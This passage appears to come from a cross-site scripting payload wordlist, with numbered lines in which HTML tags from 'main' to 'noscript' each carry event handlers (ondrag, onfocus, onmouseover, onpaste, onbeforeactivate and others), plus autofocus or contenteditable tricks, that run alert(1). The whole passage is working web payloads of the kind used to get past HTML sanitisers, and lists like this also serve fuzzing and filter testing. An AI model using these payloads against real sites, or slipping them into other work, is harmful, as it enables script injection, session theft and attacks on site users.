2808 | <main id=x tabindex=1 onbeforeactivate=alert(1)></main>
2809 | <main id=x tabindex=1 onbeforedeactivate=alert(1)></main><input autofocus>
2810 | <main id=x tabindex=1 ondeactivate=alert(1)></main><input id=y autofocus>
2811 | <main id=x tabindex=1 onfocus=alert(1)></main>
2812 | <main id=x tabindex=1 onfocusin=alert(1)></main>
2813 | <main onbeforecopy="alert(1)" contenteditable>test</main>
2814 | <main onbeforecut="alert(1)" contenteditable>test</main>
2815 | <main onbeforepaste="alert(1)" contenteditable>test</main>
2816 | <main onblur=alert(1) tabindex=1 id=x></main><input autofocus>
2817 | <main onclick="alert(1)">test</main>
2818 | <main oncontextmenu="alert(1)">test</main>
2819 | <main oncopy="alert(1)" contenteditable>test</main>
2820 | <main oncut="alert(1)" contenteditable>test</main>
2821 | <main ondblclick="alert(1)">test</main>
2822 | <main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>
2823 | <main onkeydown="alert(1)" contenteditable>test</main>
2824 | <main onkeypress="alert(1)" contenteditable>test</main>
2825 | <main onkeyup="alert(1)" contenteditable>test</main>
2826 | <main onmousedown="alert(1)">test</main>
2827 | <main onmouseenter="alert(1)">test</main>
2828 | <main onmouseleave="alert(1)">test</main>
2829 | <main onmousemove="alert(1)">test</main>
2830 | <main onmouseout="alert(1)">test</main>
2831 | <main onmouseover="alert(1)">test</main>
2832 | <main onmouseup="alert(1)">test</main>
2833 | <main onpaste="alert(1)" contenteditable>test</main>
2834 | <map draggable="true" ondrag="alert(1)">test</map>
2835 | <map draggable="true" ondragend="alert(1)">test</map>
2836 | <map draggable="true" ondragenter="alert(1)">test</map>
2837 | <map draggable="true" ondragleave="alert(1)">test</map>
2838 | <map draggable="true" ondragstart="alert(1)">test</map>
2839 | <map id=x tabindex=1 onactivate=alert(1)></map>
2840 | <map id=x tabindex=1 onbeforeactivate=alert(1)></map>
2841 | <map id=x tabindex=1 onbeforedeactivate=alert(1)></map><input autofocus>
2842 | <map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>
2843 | <map id=x tabindex=1 onfocus=alert(1)></map>
2844 | <map id=x tabindex=1 onfocusin=alert(1)></map>
2845 | <map onbeforecopy="alert(1)" contenteditable>test</map>
2846 | <map onbeforecut="alert(1)" contenteditable>test</map>
2847 | <map onbeforepaste="alert(1)" contenteditable>test</map>
2848 | <map onblur=alert(1) tabindex=1 id=x></map><input autofocus>
2849 | <map onclick="alert(1)">test</map>
2850 | <map oncontextmenu="alert(1)">test</map>
2851 | <map oncopy="alert(1)" contenteditable>test</map>
2852 | <map oncut="alert(1)" contenteditable>test</map>
2853 | <map ondblclick="alert(1)">test</map>
2854 | <map onfocusout=alert(1) tabindex=1 id=x></map><input autofocus>
2855 | <map onkeydown="alert(1)" contenteditable>test</map>
2856 | <map onkeypress="alert(1)" contenteditable>test</map>
2857 | <map onkeyup="alert(1)" contenteditable>test</map>
2858 | <map onmousedown="alert(1)">test</map>
2859 | <map onmouseenter="alert(1)">test</map>
2860 | <map onmouseleave="alert(1)">test</map>
2861 | <map onmousemove="alert(1)">test</map>
2862 | <map onmouseout="alert(1)">test</map>
2863 | <map onmouseover="alert(1)">test</map>
2864 | <map onmouseup="alert(1)">test</map>
2865 | <map onpaste="alert(1)" contenteditable>test</map>
2866 | <mark draggable="true" ondrag="alert(1)">test</mark>
2867 | <mark draggable="true" ondragend="alert(1)">test</mark>
2868 | <mark draggable="true" ondragenter="alert(1)">test</mark>
2869 | <mark draggable="true" ondragleave="alert(1)">test</mark>
2870 | <mark draggable="true" ondragstart="alert(1)">test</mark>
2871 | <mark id=x tabindex=1 onactivate=alert(1)></mark>
2872 | <mark id=x tabindex=1 onbeforeactivate=alert(1)></mark>
2873 | <mark id=x tabindex=1 onbeforedeactivate=alert(1)></mark><input autofocus>
2874 | <mark id=x tabindex=1 ondeactivate=alert(1)></mark><input id=y autofocus>
2875 | <mark id=x tabindex=1 onfocus=alert(1)></mark>
2876 | <mark id=x tabindex=1 onfocusin=alert(1)></mark>
2877 | <mark onbeforecopy="alert(1)" contenteditable>test</mark>
2878 | <mark onbeforecut="alert(1)" contenteditable>test</mark>
2879 | <mark onbeforepaste="alert(1)" contenteditable>test</mark>
2880 | <mark onblur=alert(1) tabindex=1 id=x></mark><input autofocus>
2881 | <mark onclick="alert(1)">test</mark>
2882 | <mark oncontextmenu="alert(1)">test</mark>
2883 | <mark oncopy="alert(1)" contenteditable>test</mark>
2884 | <mark oncut="alert(1)" contenteditable>test</mark>
2885 | <mark ondblclick="alert(1)">test</mark>
2886 | <mark onfocusout=alert(1) tabindex=1 id=x></mark><input autofocus>
2887 | <mark onkeydown="alert(1)" contenteditable>test</mark>
2888 | <mark onkeypress="alert(1)" contenteditable>test</mark>
2889 | <mark onkeyup="alert(1)" contenteditable>test</mark>
2890 | <mark onmousedown="alert(1)">test</mark>
2891 | <mark onmouseenter="alert(1)">test</mark>
2892 | <mark onmouseleave="alert(1)">test</mark>
2893 | <mark onmousemove="alert(1)">test</mark>
2894 | <mark onmouseout="alert(1)">test</mark>
2895 | <mark onmouseover="alert(1)">test</mark>
2896 | <mark onmouseup="alert(1)">test</mark>
2897 | <mark onpaste="alert(1)" contenteditable>test</mark>
2898 | <marquee draggable="true" ondrag="alert(1)">test</marquee>
2899 | <marquee draggable="true" ondragend="alert(1)">test</marquee>
2900 | <marquee draggable="true" ondragenter="alert(1)">test</marquee>
2901 | <marquee draggable="true" ondragleave="alert(1)">test</marquee>
2902 | <marquee draggable="true" ondragstart="alert(1)">test</marquee>
2903 | <marquee id=x tabindex=1 onactivate=alert(1)></marquee>
2904 | <marquee id=x tabindex=1 onbeforeactivate=alert(1)></marquee>
2905 | <marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>
2906 | <marquee id=x tabindex=1 ondeactivate=alert(1)></marquee><input id=y autofocus>
2907 | <marquee id=x tabindex=1 onfocus=alert(1)></marquee>
2908 | <marquee id=x tabindex=1 onfocusin=alert(1)></marquee>
2909 | <marquee onbeforecopy="alert(1)" contenteditable>test</marquee>
2910 | <marquee onbeforecut="alert(1)" contenteditable>test</marquee>
2911 | <marquee onbeforepaste="alert(1)" contenteditable>test</marquee>
2912 | <marquee onblur=alert(1) tabindex=1 id=x></marquee><input autofocus>
2913 | <marquee onclick="alert(1)">test</marquee>
2914 | <marquee oncontextmenu="alert(1)">test</marquee>
2915 | <marquee oncopy="alert(1)" contenteditable>test</marquee>
2916 | <marquee oncut="alert(1)" contenteditable>test</marquee>
2917 | <marquee ondblclick="alert(1)">test</marquee>
2918 | <marquee onfocusout=alert(1) tabindex=1 id=x></marquee><input autofocus>
2919 | <marquee onkeydown="alert(1)" contenteditable>test</marquee>
2920 | <marquee onkeypress="alert(1)" contenteditable>test</marquee>
2921 | <marquee onkeyup="alert(1)" contenteditable>test</marquee>
2922 | <marquee onmousedown="alert(1)">test</marquee>
2923 | <marquee onmouseenter="alert(1)">test</marquee>
2924 | <marquee onmouseleave="alert(1)">test</marquee>
2925 | <marquee onmousemove="alert(1)">test</marquee>
2926 | <marquee onmouseout="alert(1)">test</marquee>
2927 | <marquee onmouseover="alert(1)">test</marquee>
2928 | <marquee onmouseup="alert(1)">test</marquee>
2929 | <marquee onpaste="alert(1)" contenteditable>test</marquee>
2930 | <marquee onstart=alert(1)>XSS</marquee>
2931 | <marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
2932 | <marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
2933 | <menu draggable="true" ondrag="alert(1)">test</menu>
2934 | <menu draggable="true" ondragend="alert(1)">test</menu>
2935 | <menu draggable="true" ondragenter="alert(1)">test</menu>
2936 | <menu draggable="true" ondragleave="alert(1)">test</menu>
2937 | <menu draggable="true" ondragstart="alert(1)">test</menu>
2938 | <menu id=x tabindex=1 onactivate=alert(1)></menu>
2939 | <menu id=x tabindex=1 onbeforeactivate=alert(1)></menu>
2940 | <menu id=x tabindex=1 onbeforedeactivate=alert(1)></menu><input autofocus>
2941 | <menu id=x tabindex=1 ondeactivate=alert(1)></menu><input id=y autofocus>
2942 | <menu id=x tabindex=1 onfocus=alert(1)></menu>
2943 | <menu id=x tabindex=1 onfocusin=alert(1)></menu>
2944 | <menu onbeforecopy="alert(1)" contenteditable>test</menu>
2945 | <menu onbeforecut="alert(1)" contenteditable>test</menu>
2946 | <menu onbeforepaste="alert(1)" contenteditable>test</menu>
2947 | <menu onblur=alert(1) tabindex=1 id=x></menu><input autofocus>
2948 | <menu onclick="alert(1)">test</menu>
2949 | <menu oncontextmenu="alert(1)">test</menu>
2950 | <menu oncopy="alert(1)" contenteditable>test</menu>
2951 | <menu oncut="alert(1)" contenteditable>test</menu>
2952 | <menu ondblclick="alert(1)">test</menu>
2953 | <menu onfocusout=alert(1) tabindex=1 id=x></menu><input autofocus>
2954 | <menu onkeydown="alert(1)" contenteditable>test</menu>
2955 | <menu onkeypress="alert(1)" contenteditable>test</menu>
2956 | <menu onkeyup="alert(1)" contenteditable>test</menu>
2957 | <menu onmousedown="alert(1)">test</menu>
2958 | <menu onmouseenter="alert(1)">test</menu>
2959 | <menu onmouseleave="alert(1)">test</menu>
2960 | <menu onmousemove="alert(1)">test</menu>
2961 | <menu onmouseout="alert(1)">test</menu>
2962 | <menu onmouseover="alert(1)">test</menu>
2963 | <menu onmouseup="alert(1)">test</menu>
2964 | <menu onpaste="alert(1)" contenteditable>test</menu>
2965 | <menuitem draggable="true" ondrag="alert(1)">test</menuitem>
2966 | <menuitem draggable="true" ondragend="alert(1)">test</menuitem>
2967 | <menuitem draggable="true" ondragenter="alert(1)">test</menuitem>
2968 | <menuitem draggable="true" ondragleave="alert(1)">test</menuitem>
2969 | <menuitem draggable="true" ondragstart="alert(1)">test</menuitem>
2970 | <menuitem id=x tabindex=1 onactivate=alert(1)></menuitem>
2971 | <menuitem id=x tabindex=1 onbeforeactivate=alert(1)></menuitem>
2972 | <menuitem id=x tabindex=1 onbeforedeactivate=alert(1)></menuitem><input autofocus>
2973 | <menuitem id=x tabindex=1 ondeactivate=alert(1)></menuitem><input id=y autofocus>
2974 | <menuitem id=x tabindex=1 onfocus=alert(1)></menuitem>
2975 | <menuitem id=x tabindex=1 onfocusin=alert(1)></menuitem>
2976 | <menuitem onbeforecopy="alert(1)" contenteditable>test</menuitem>
2977 | <menuitem onbeforecut="alert(1)" contenteditable>test</menuitem>
2978 | <menuitem onbeforepaste="alert(1)" contenteditable>test</menuitem>
2979 | <menuitem onblur=alert(1) tabindex=1 id=x></menuitem><input autofocus>
2980 | <menuitem onclick="alert(1)">test</menuitem>
2981 | <menuitem oncontextmenu="alert(1)">test</menuitem>
2982 | <menuitem oncopy="alert(1)" contenteditable>test</menuitem>
2983 | <menuitem oncut="alert(1)" contenteditable>test</menuitem>
2984 | <menuitem ondblclick="alert(1)">test</menuitem>
2985 | <menuitem onfocusout=alert(1) tabindex=1 id=x></menuitem><input autofocus>
2986 | <menuitem onkeydown="alert(1)" contenteditable>test</menuitem>
2987 | <menuitem onkeypress="alert(1)" contenteditable>test</menuitem>
2988 | <menuitem onkeyup="alert(1)" contenteditable>test</menuitem>
2989 | <menuitem onmousedown="alert(1)">test</menuitem>
2990 | <menuitem onmouseenter="alert(1)">test</menuitem>
2991 | <menuitem onmouseleave="alert(1)">test</menuitem>
2992 | <menuitem onmousemove="alert(1)">test</menuitem>
2993 | <menuitem onmouseout="alert(1)">test</menuitem>
2994 | <menuitem onmouseover="alert(1)">test</menuitem>
2995 | <menuitem onmouseup="alert(1)">test</menuitem>
2996 | <menuitem onpaste="alert(1)" contenteditable>test</menuitem>
2997 | <meta draggable="true" ondrag="alert(1)">test</meta>
2998 | <meta draggable="true" ondragend="alert(1)">test</meta>
2999 | <meta draggable="true" ondragenter="alert(1)">test</meta>
3000 | <meta draggable="true" ondragleave="alert(1)">test</meta>
3001 | <meta draggable="true" ondragstart="alert(1)">test</meta>
3002 | <meta id=x tabindex=1 onactivate=alert(1)></meta>
3003 | <meta id=x tabindex=1 onbeforeactivate=alert(1)></meta>
3004 | <meta id=x tabindex=1 onbeforedeactivate=alert(1)></meta><input autofocus>
3005 | <meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>
3006 | <meta id=x tabindex=1 onfocus=alert(1)></meta>
3007 | <meta id=x tabindex=1 onfocusin=alert(1)></meta>
3008 | <meta onbeforecopy="alert(1)" contenteditable>test</meta>
3009 | <meta onbeforecut="alert(1)" contenteditable>test</meta>
3010 | <meta onbeforepaste="alert(1)" contenteditable>test</meta>
3011 | <meta onblur=alert(1) tabindex=1 id=x></meta><input autofocus>
3012 | <meta onclick="alert(1)">test</meta>
3013 | <meta oncontextmenu="alert(1)">test</meta>
3014 | <meta oncopy="alert(1)" contenteditable>test</meta>
3015 | <meta oncut="alert(1)" contenteditable>test</meta>
3016 | <meta ondblclick="alert(1)">test</meta>
3017 | <meta onfocusout=alert(1) tabindex=1 id=x></meta><input autofocus>
3018 | <meta onkeydown="alert(1)" contenteditable>test</meta>
3019 | <meta onkeypress="alert(1)" contenteditable>test</meta>
3020 | <meta onkeyup="alert(1)" contenteditable>test</meta>
3021 | <meta onmousedown="alert(1)">test</meta>
3022 | <meta onmouseenter="alert(1)">test</meta>
3023 | <meta onmouseleave="alert(1)">test</meta>
3024 | <meta onmousemove="alert(1)">test</meta>
3025 | <meta onmouseout="alert(1)">test</meta>
3026 | <meta onmouseover="alert(1)">test</meta>
3027 | <meta onmouseup="alert(1)">test</meta>
3028 | <meta onpaste="alert(1)" contenteditable>test</meta>
3029 | <meter draggable="true" ondrag="alert(1)">test</meter>
3030 | <meter draggable="true" ondragend="alert(1)">test</meter>
3031 | <meter draggable="true" ondragenter="alert(1)">test</meter>
3032 | <meter draggable="true" ondragleave="alert(1)">test</meter>
3033 | <meter draggable="true" ondragstart="alert(1)">test</meter>
3034 | <meter id=x tabindex=1 onactivate=alert(1)></meter>
3035 | <meter id=x tabindex=1 onbeforeactivate=alert(1)></meter>
3036 | <meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>
3037 | <meter id=x tabindex=1 ondeactivate=alert(1)></meter><input id=y autofocus>
3038 | <meter id=x tabindex=1 onfocus=alert(1)></meter>
3039 | <meter id=x tabindex=1 onfocusin=alert(1)></meter>
3040 | <meter onbeforecopy="alert(1)" contenteditable>test</meter>
3041 | <meter onbeforecut="alert(1)" contenteditable>test</meter>
3042 | <meter onbeforepaste="alert(1)" contenteditable>test</meter>
3043 | <meter onblur=alert(1) tabindex=1 id=x></meter><input autofocus>
3044 | <meter onclick="alert(1)">test</meter>
3045 | <meter oncontextmenu="alert(1)">test</meter>
3046 | <meter oncopy="alert(1)" contenteditable>test</meter>
3047 | <meter oncut="alert(1)" contenteditable>test</meter>
3048 | <meter ondblclick="alert(1)">test</meter>
3049 | <meter onfocusout=alert(1) tabindex=1 id=x></meter><input autofocus>
3050 | <meter onkeydown="alert(1)" contenteditable>test</meter>
3051 | <meter onkeypress="alert(1)" contenteditable>test</meter>
3052 | <meter onkeyup="alert(1)" contenteditable>test</meter>
3053 | <meter onmousedown="alert(1)">test</meter>
3054 | <meter onmouseenter="alert(1)">test</meter>
3055 | <meter onmouseleave="alert(1)">test</meter>
3056 | <meter onmousemove="alert(1)">test</meter>
3057 | <meter onmouseout="alert(1)">test</meter>
3058 | <meter onmouseover="alert(1)">test</meter>
3059 | <meter onmouseup="alert(1)">test</meter>
3060 | <meter onpaste="alert(1)" contenteditable>test</meter>
3061 | <multicol draggable="true" ondrag="alert(1)">test</multicol>
3062 | <multicol draggable="true" ondragend="alert(1)">test</multicol>
3063 | <multicol draggable="true" ondragenter="alert(1)">test</multicol>
3064 | <multicol draggable="true" ondragleave="alert(1)">test</multicol>
3065 | <multicol draggable="true" ondragstart="alert(1)">test</multicol>
3066 | <multicol id=x tabindex=1 onactivate=alert(1)></multicol>
3067 | <multicol id=x tabindex=1 onbeforeactivate=alert(1)></multicol>
3068 | <multicol id=x tabindex=1 onbeforedeactivate=alert(1)></multicol><input autofocus>
3069 | <multicol id=x tabindex=1 ondeactivate=alert(1)></multicol><input id=y autofocus>
3070 | <multicol id=x tabindex=1 onfocus=alert(1)></multicol>
3071 | <multicol id=x tabindex=1 onfocusin=alert(1)></multicol>
3072 | <multicol onbeforecopy="alert(1)" contenteditable>test</multicol>
3073 | <multicol onbeforecut="alert(1)" contenteditable>test</multicol>
3074 | <multicol onbeforepaste="alert(1)" contenteditable>test</multicol>
3075 | <multicol onblur=alert(1) tabindex=1 id=x></multicol><input autofocus>
3076 | <multicol onclick="alert(1)">test</multicol>
3077 | <multicol oncontextmenu="alert(1)">test</multicol>
3078 | <multicol oncopy="alert(1)" contenteditable>test</multicol>
3079 | <multicol oncut="alert(1)" contenteditable>test</multicol>
3080 | <multicol ondblclick="alert(1)">test</multicol>
3081 | <multicol onfocusout=alert(1) tabindex=1 id=x></multicol><input autofocus>
3082 | <multicol onkeydown="alert(1)" contenteditable>test</multicol>
3083 | <multicol onkeypress="alert(1)" contenteditable>test</multicol>
3084 | <multicol onkeyup="alert(1)" contenteditable>test</multicol>
3085 | <multicol onmousedown="alert(1)">test</multicol>
3086 | <multicol onmouseenter="alert(1)">test</multicol>
3087 | <multicol onmouseleave="alert(1)">test</multicol>
3088 | <multicol onmousemove="alert(1)">test</multicol>
3089 | <multicol onmouseout="alert(1)">test</multicol>
3090 | <multicol onmouseover="alert(1)">test</multicol>
3091 | <multicol onmouseup="alert(1)">test</multicol>
3092 | <multicol onpaste="alert(1)" contenteditable>test</multicol>
3093 | <nav draggable="true" ondrag="alert(1)">test</nav>
3094 | <nav draggable="true" ondragend="alert(1)">test</nav>
3095 | <nav draggable="true" ondragenter="alert(1)">test</nav>
3096 | <nav draggable="true" ondragleave="alert(1)">test</nav>
3097 | <nav draggable="true" ondragstart="alert(1)">test</nav>
3098 | <nav id=x tabindex=1 onactivate=alert(1)></nav>
3099 | <nav id=x tabindex=1 onbeforeactivate=alert(1)></nav>
3100 | <nav id=x tabindex=1 onbeforedeactivate=alert(1)></nav><input autofocus>
3101 | <nav id=x tabindex=1 ondeactivate=alert(1)></nav><input id=y autofocus>
3102 | <nav id=x tabindex=1 onfocus=alert(1)></nav>
3103 | <nav id=x tabindex=1 onfocusin=alert(1)></nav>
3104 | <nav onbeforecopy="alert(1)" contenteditable>test</nav>
3105 | <nav onbeforecut="alert(1)" contenteditable>test</nav>
3106 | <nav onbeforepaste="alert(1)" contenteditable>test</nav>
3107 | <nav onblur=alert(1) tabindex=1 id=x></nav><input autofocus>
3108 | <nav onclick="alert(1)">test</nav>
3109 | <nav oncontextmenu="alert(1)">test</nav>
3110 | <nav oncopy="alert(1)" contenteditable>test</nav>
3111 | <nav oncut="alert(1)" contenteditable>test</nav>
3112 | <nav ondblclick="alert(1)">test</nav>
3113 | <nav onfocusout=alert(1) tabindex=1 id=x></nav><input autofocus>
3114 | <nav onkeydown="alert(1)" contenteditable>test</nav>
3115 | <nav onkeypress="alert(1)" contenteditable>test</nav>
3116 | <nav onkeyup="alert(1)" contenteditable>test</nav>
3117 | <nav onmousedown="alert(1)">test</nav>
3118 | <nav onmouseenter="alert(1)">test</nav>
3119 | <nav onmouseleave="alert(1)">test</nav>
3120 | <nav onmousemove="alert(1)">test</nav>
3121 | <nav onmouseout="alert(1)">test</nav>
3122 | <nav onmouseover="alert(1)">test</nav>
3123 | <nav onmouseup="alert(1)">test</nav>
3124 | <nav onpaste="alert(1)" contenteditable>test</nav>
3125 | <nextid draggable="true" ondrag="alert(1)">test</nextid>
3126 | <nextid draggable="true" ondragend="alert(1)">test</nextid>
3127 | <nextid draggable="true" ondragenter="alert(1)">test</nextid>
3128 | <nextid draggable="true" ondragleave="alert(1)">test</nextid>
3129 | <nextid draggable="true" ondragstart="alert(1)">test</nextid>
3130 | <nextid id=x tabindex=1 onactivate=alert(1)></nextid>
3131 | <nextid id=x tabindex=1 onbeforeactivate=alert(1)></nextid>
3132 | <nextid id=x tabindex=1 onbeforedeactivate=alert(1)></nextid><input autofocus>
3133 | <nextid id=x tabindex=1 ondeactivate=alert(1)></nextid><input id=y autofocus>
3134 | <nextid id=x tabindex=1 onfocus=alert(1)></nextid>
3135 | <nextid id=x tabindex=1 onfocusin=alert(1)></nextid>
3136 | <nextid onbeforecopy="alert(1)" contenteditable>test</nextid>
3137 | <nextid onbeforecut="alert(1)" contenteditable>test</nextid>
3138 | <nextid onbeforepaste="alert(1)" contenteditable>test</nextid>
3139 | <nextid onblur=alert(1) tabindex=1 id=x></nextid><input autofocus>
3140 | <nextid onclick="alert(1)">test</nextid>
3141 | <nextid oncontextmenu="alert(1)">test</nextid>
3142 | <nextid oncopy="alert(1)" contenteditable>test</nextid>
3143 | <nextid oncut="alert(1)" contenteditable>test</nextid>
3144 | <nextid ondblclick="alert(1)">test</nextid>
3145 | <nextid onfocusout=alert(1) tabindex=1 id=x></nextid><input autofocus>
3146 | <nextid onkeydown="alert(1)" contenteditable>test</nextid>
3147 | <nextid onkeypress="alert(1)" contenteditable>test</nextid>
3148 | <nextid onkeyup="alert(1)" contenteditable>test</nextid>
3149 | <nextid onmousedown="alert(1)">test</nextid>
3150 | <nextid onmouseenter="alert(1)">test</nextid>
3151 | <nextid onmouseleave="alert(1)">test</nextid>
3152 | <nextid onmousemove="alert(1)">test</nextid>
3153 | <nextid onmouseout="alert(1)">test</nextid>
3154 | <nextid onmouseover="alert(1)">test</nextid>
3155 | <nextid onmouseup="alert(1)">test</nextid>
3156 | <nextid onpaste="alert(1)" contenteditable>test</nextid>
3157 | <nobr draggable="true" ondrag="alert(1)">test</nobr>
3158 | <nobr draggable="true" ondragend="alert(1)">test</nobr>
3159 | <nobr draggable="true" ondragenter="alert(1)">test</nobr>
3160 | <nobr draggable="true" ondragleave="alert(1)">test</nobr>
3161 | <nobr draggable="true" ondragstart="alert(1)">test</nobr>
3162 | <nobr id=x tabindex=1 onactivate=alert(1)></nobr>
3163 | <nobr id=x tabindex=1 onbeforeactivate=alert(1)></nobr>
3164 | <nobr id=x tabindex=1 onbeforedeactivate=alert(1)></nobr><input autofocus>
3165 | <nobr id=x tabindex=1 ondeactivate=alert(1)></nobr><input id=y autofocus>
3166 | <nobr id=x tabindex=1 onfocus=alert(1)></nobr>
3167 | <nobr id=x tabindex=1 onfocusin=alert(1)></nobr>
3168 | <nobr onbeforecopy="alert(1)" contenteditable>test</nobr>
3169 | <nobr onbeforecut="alert(1)" contenteditable>test</nobr>
3170 | <nobr onbeforepaste="alert(1)" contenteditable>test</nobr>
3171 | <nobr onblur=alert(1) tabindex=1 id=x></nobr><input autofocus>
3172 | <nobr onclick="alert(1)">test</nobr>
3173 | <nobr oncontextmenu="alert(1)">test</nobr>
3174 | <nobr oncopy="alert(1)" contenteditable>test</nobr>
3175 | <nobr oncut="alert(1)" contenteditable>test</nobr>
3176 | <nobr ondblclick="alert(1)">test</nobr>
3177 | <nobr onfocusout=alert(1) tabindex=1 id=x></nobr><input autofocus>
3178 | <nobr onkeydown="alert(1)" contenteditable>test</nobr>
3179 | <nobr onkeypress="alert(1)" contenteditable>test</nobr>
3180 | <nobr onkeyup="alert(1)" contenteditable>test</nobr>
3181 | <nobr onmousedown="alert(1)">test</nobr>
3182 | <nobr onmouseenter="alert(1)">test</nobr>
3183 | <nobr onmouseleave="alert(1)">test</nobr>
3184 | <nobr onmousemove="alert(1)">test</nobr>
3185 | <nobr onmouseout="alert(1)">test</nobr>
3186 | <nobr onmouseover="alert(1)">test</nobr>
3187 | <nobr onmouseup="alert(1)">test</nobr>
3188 | <nobr onpaste="alert(1)" contenteditable>test</nobr>
3189 | <noembed draggable="true" ondrag="alert(1)">test</noembed>
3190 | <noembed draggable="true" ondragend="alert(1)">test</noembed>
3191 | <noembed draggable="true" ondragenter="alert(1)">test</noembed>
3192 | <noembed draggable="true" ondragleave="alert(1)">test</noembed>
3193 | <noembed draggable="true" ondragstart="alert(1)">test</noembed>
3194 | <noembed id=x tabindex=1 onactivate=alert(1)></noembed>
3195 | <noembed id=x tabindex=1 onbeforeactivate=alert(1)></noembed>
3196 | <noembed id=x tabindex=1 onbeforedeactivate=alert(1)></noembed><input autofocus>
3197 | <noembed id=x tabindex=1 ondeactivate=alert(1)></noembed><input id=y autofocus>
3198 | <noembed id=x tabindex=1 onfocus=alert(1)></noembed>
3199 | <noembed id=x tabindex=1 onfocusin=alert(1)></noembed>
3200 | <noembed onbeforecopy="alert(1)" contenteditable>test</noembed>
3201 | <noembed onbeforecut="alert(1)" contenteditable>test</noembed>
3202 | <noembed onbeforepaste="alert(1)" contenteditable>test</noembed>
3203 | <noembed onblur=alert(1) tabindex=1 id=x></noembed><input autofocus>
3204 | <noembed onclick="alert(1)">test</noembed>
3205 | <noembed oncontextmenu="alert(1)">test</noembed>
3206 | <noembed oncopy="alert(1)" contenteditable>test</noembed>
3207 | <noembed oncut="alert(1)" contenteditable>test</noembed>
3208 | <noembed ondblclick="alert(1)">test</noembed>
3209 | <noembed onfocusout=alert(1) tabindex=1 id=x></noembed><input autofocus>
3210 | <noembed onkeydown="alert(1)" contenteditable>test</noembed>
3211 | <noembed onkeypress="alert(1)" contenteditable>test</noembed>
3212 | <noembed onkeyup="alert(1)" contenteditable>test</noembed>
3213 | <noembed onmousedown="alert(1)">test</noembed>
3214 | <noembed onmouseenter="alert(1)">test</noembed>
3215 | <noembed onmouseleave="alert(1)">test</noembed>
3216 | <noembed onmousemove="alert(1)">test</noembed>
3217 | <noembed onmouseout="alert(1)">test</noembed>
3218 | <noembed onmouseover="alert(1)">test</noembed>
3219 | <noembed onmouseup="alert(1)">test</noembed>
3220 | <noembed onpaste="alert(1)" contenteditable>test</noembed>
3221 | <noframes draggable="true" ondrag="alert(1)">test</noframes>
3222 | <noframes draggable="true" ondragend="alert(1)">test</noframes>
3223 | <noframes draggable="true" ondragenter="alert(1)">test</noframes>
3224 | <noframes draggable="true" ondragleave="alert(1)">test</noframes>
3225 | <noframes draggable="true" ondragstart="alert(1)">test</noframes>
3226 | <noframes id=x tabindex=1 onactivate=alert(1)></noframes>
3227 | <noframes id=x tabindex=1 onbeforeactivate=alert(1)></noframes>
3228 | <noframes id=x tabindex=1 onbeforedeactivate=alert(1)></noframes><input autofocus>
3229 | <noframes id=x tabindex=1 ondeactivate=alert(1)></noframes><input id=y autofocus>
3230 | <noframes id=x tabindex=1 onfocus=alert(1)></noframes>
3231 | <noframes id=x tabindex=1 onfocusin=alert(1)></noframes>
3232 | <noframes onbeforecopy="alert(1)" contenteditable>test</noframes>
3233 | <noframes onbeforecut="alert(1)" contenteditable>test</noframes>
3234 | <noframes onbeforepaste="alert(1)" contenteditable>test</noframes>
3235 | <noframes onblur=alert(1) tabindex=1 id=x></noframes><input autofocus>
3236 | <noframes onclick="alert(1)">test</noframes>
3237 | <noframes oncontextmenu="alert(1)">test</noframes>
3238 | <noframes oncopy="alert(1)" contenteditable>test</noframes>
3239 | <noframes oncut="alert(1)" contenteditable>test</noframes>
3240 | <noframes ondblclick="alert(1)">test</noframes>
3241 | <noframes onfocusout=alert(1) tabindex=1 id=x></noframes><input autofocus>
3242 | <noframes onkeydown="alert(1)" contenteditable>test</noframes>
3243 | <noframes onkeypress="alert(1)" contenteditable>test</noframes>
3244 | <noframes onkeyup="alert(1)" contenteditable>test</noframes>
3245 | <noframes onmousedown="alert(1)">test</noframes>
3246 | <noframes onmouseenter="alert(1)">test</noframes>
3247 | <noframes onmouseleave="alert(1)">test</noframes>
3248 | <noframes onmousemove="alert(1)">test</noframes>
3249 | <noframes onmouseout="alert(1)">test</noframes>
3250 | <noframes onmouseover="alert(1)">test</noframes>
3251 | <noframes onmouseup="alert(1)">test</noframes>
3252 | <noframes onpaste="alert(1)" contenteditable>test</noframes>
3253 | <noscript draggable="true" ondrag="alert(1)">test</noscript>
3254 | <noscript draggable="true" ondragend="alert(1)">test</noscript>
3255 | <noscript draggable="true" ondragenter="alert(1)">test</noscript>
3256 | <noscript draggable="true" ondragleave="alert(1)">test</noscript>
3257 | <noscript draggable="true" ondragstart="alert(1)">test</noscript>
3258 | <noscript id=x tabindex=1 onactivate=alert(1)></noscript>
3259 | <noscript id=x tabindex=1 onbeforeactivate=alert(1)></noscript>
3260 | <noscript id=x tabindex=1 onbeforedeactivate=alert(1)></noscript><input autofocus>
3261 | <noscript id=x tabindex=1 ondeactivate=alert(1)></noscript><input id=y autofocus>
3262 | <noscript id=x tabindex=1 onfocus=alert(1)></noscript>
3263 | <noscript id=x tabindex=1 onfocusin=alert(1)></noscript>
3264 | <noscript onbeforecopy="alert(1)" contenteditable>test</noscript>
3265 | <noscript onbeforecut="alert(1)" contenteditable>test</noscript>
3266 | <noscript onbeforepaste="alert(1)" contenteditable>test</noscript>
3267 | <noscript onblur=alert(1) tabindex=1 id=x></noscript><input autofocus>
3268 | <noscript onclick="alert(1)">test</noscript>
3269 | <noscript oncontextmenu="alert(1)">test</noscript>
3270 | <noscript oncopy="alert(1)" contenteditable>test</noscript>
3271 | <noscript oncut="alert(1)" contenteditable>test</noscript>
3272 | <noscript ondblclick="alert(1)">test</noscript>
3273 | <noscript onfocusout=alert(1) tabindex=1 id=x></noscript><input autofocus>
3274 | <noscript onkeydown="alert(1)" contenteditable>test</noscript>
3275 | <noscript onkeypress="alert(1)" contenteditable>test</noscript>
3276 | <noscript onkeyup="alert(1)" contenteditable>test</noscript>
3277 | <noscript onmousedown="alert(1)">test</noscript>
3278 | <noscript onmouseenter="alert(1)">test</noscript>
3279 | <noscript onmouseleave="alert(1)">test</noscript>
3280 | <noscript onmousemove="alert(1)">test</noscript>
3281 | <noscript onmouseout="alert(1)">test</noscript>
